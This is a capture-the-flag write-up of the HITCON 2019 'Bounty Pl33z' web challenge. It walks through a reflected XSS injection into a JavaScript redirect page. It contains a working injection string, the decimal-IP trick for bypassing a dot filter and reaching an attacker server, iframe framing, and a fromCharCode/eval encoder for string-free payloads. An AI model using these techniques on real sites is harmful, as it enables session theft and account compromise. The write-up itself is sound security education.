# Bounty Pl33z

Author: [@zwad3](https://twitter.com/zwad3)

Everyone loves bug bounties, right? They're even better when you get an 🍊flag from them.

## Overview

The setup for this problem is reminiscent of the classic XSS problem. Dropped into the site, all you have is a URL submission field (that is whitelisted to the current domain), and a link to "bugs." Curiously, clicking this link brings you not to another page, but rather to a broken URL (bugs.orange.ctf). I wonder if the problem is working?

## Line of Bugs

As it turns out, clicking that link does not directly take you to bugs.orange.ctf, but rather leads you to `/fd.php?q=bugs` first. The result of that page is a small javascript application that forwards you to bugs.orange.ctf. Let's see what we can do with this

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <script type="text/javascript">
        if (window.top == window.self) {
            window.self.location.href = "https://bugs.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
        } else {
            var data = JSON.stringify({
                message: 'CTF.API.remote',
                data: {
                    location: "https://bugs.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
                }
            });
            window.parent.postMessage(
                data,
                "https://bugs.orange.ctf"
            );
        }
    </script>
</head>
<body>
</body>
</html>
```

What happens when we change the query parameter to be something else? If this is just doing string replacement, setting it to be a double quote should break things entirely.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <script type="text/javascript">
        if (window.top == window.self) {
            window.self.location.href = "https://".orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
        } else {
            var data = JSON.stringify({
                message: 'CTF.API.remote',
                data: {
                    location: "https://".orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
                }
            });
            window.parent.postMessage(
                data,
                "https://".orange.ctf"
            );
        }
    </script>
</head>
<body>
</body>
</html>
```

Oh look, it broke things entirely. After playing around with it, we found that there were a few limitations to what your query could be. Specifically, it could not have

 1. More than one double quote
 2. More than one single quote
 3. Any slashes
 4. Any backslashes
 5. Any periods

Losing quotes and comments is a huge pain, but we still have unlimited template strings. I wonder what we can do with those.

## Some Time Later

The biggest difficulty here is getting somethign that parses as valid JS. Once we have that, it should be easy to turn it into somethign useful, but getting a valid JS file when your injection goes to three seperate places is quite the challenge. After an hour or two spent playing with it, we finally came up with the string

```js
`}`}; alert(1); {("; `}; class ${x = `${`
```

When injected into the URL, this becomes valid JS. Furthermore, with some restrictions, you can inject code where the `alert(1)` is as long as it doesn't have any strings in it. However, there's an issue. Namely, this will never be run when loaded directly. The top level `if` clause will be satisfied, and instead of executing our code the browser will try to navigate to an invalid link. If we want our exploit to work, we need the `if` condition to return false.

## Offsite Trading Company

We can do this by loading our exploit inside of an `iframe` on a page we control. However to do that we need to get the bot to our site in the first place. We can't make normal URLs without the `.` character, but fortunately we can create a server and use the numeric form of the IP to navigate there. For instance, our server was hosted at `134.209.220.198`, but we can represent that as `2261900486`. If we just set the `q` parameter to be `2261900486?`, the bot will visit us. This does require us to host over HTTPS, but the bot accepts self-signed certs so this isn't an issue.

From there, we can simply downgrade the connection to HTTP, and load our exploit in an iframe. To get around the lack of strings in our injection point, I wrote this silly little render function:

```ts
let makeDumbLetter = (l: string) => {
    return `((function ${l}() {}) + [])[9]`;
}

let render = (js: string) => {
    let fnName = "fromCharCode".split("").map((c) => makeDumbLetter(c)).join(" + ");
    return `eval(String[${fnName}](${js.split("").map((c) => c.charCodeAt(0)).join(",")}))`;
}
```

That's it! Send the initial payload to bot and make sure your server responds with an appropriate payload. You can see the full exploit script at [exploit.ts](https://github.com/pwning/writeups/blob/master/hitcon2019/bounty_pl33z/index.ts).